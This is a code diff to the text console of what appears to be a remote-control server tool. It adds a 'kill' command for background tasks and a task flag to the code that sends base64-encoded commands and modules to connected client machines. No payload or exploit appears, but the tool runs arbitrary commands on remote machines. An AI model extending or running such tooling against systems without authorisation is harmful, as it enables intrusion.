@@ -3,7 +3,7 @@
 """Interacts with the user via urwid."""
 __author__ = "Marten4n6"
 __license__ = "GPLv3"
-__version__ = "1.0.0"
+__version__ = "1.1.0"
 
 from model import *
 from modules import *
@@ -267,6 +267,7 @@ class View(urwid.Frame):
             self.output_view.add("connect <ID>     -   Connect to the client.")
             self.output_view.add("modules          -   Show a list of available modules.")
             self.output_view.add("use <module>     -   Run the module on the client.")
+            self.output_view.add("kill <task_name> -   Kills the running task (background module).")
             if not self._current_client:
                 self.output_view.add("exit             -   Close the server and exit.")
             else:
@@ -348,12 +349,25 @@ class View(urwid.Frame):
                             wait_thread.start()
                         except KeyError:
                             self.output_view.add("That module doesn't exist!", "attention")
+                elif command.startswith("kill"):
+                    # Kills a running task.
+                    module_name = command.replace("kill ", "").strip()
+
+                    if module_name == "kill":
+                        self.output_view.add("Invalid task name (see \"modules\").", "attention")
+                        self.output_view.add("Usage: kill <task_name>", "attention")
+                    else:
+                        self.output_view.add("Attempting to kill task \"%s\"..." % module_name, "info")
+
+                        self._model.send_command(Command(
+                            self._current_client.id, base64.b64encode("kill_task"), module_name
+                        ))
                 else:
                     self.output_view.add("Running command: " + command, "info")
                     self._model.send_command(Command(self._current_client.id, base64.b64encode(command)))
 
     def module_wait(self, module_view, module_thread, successful, module_imp):
-        """Waits for the module to finish then sends the module to the client."""
+        """Waits for the module setup to finish then sends the module to the client."""
         module_thread.join()  # Wait until the thread finishes.
         module_view.cleanup()
 
@@ -363,10 +377,16 @@ class View(urwid.Frame):
         if successful.get():
             # The module setup was successful.
             module_code = base64.b64encode(dedent(module_imp.run()))
+            is_task = module_imp.info["Task"]
 
             self.output_view.add("Running module \"%s\"..." % module_view.module_name, "info")
+
+            if is_task:
+                self.output_view.add("This module is a background task, use \"kill %s\" to stop it." %
+                                     module_view.module_name, "info")
+
             self._model.send_command(Command(
-                self._current_client.id, module_code, module_view.module_name
+                self._current_client.id, module_code, module_view.module_name, is_task
             ))
 
         self.async_reload()
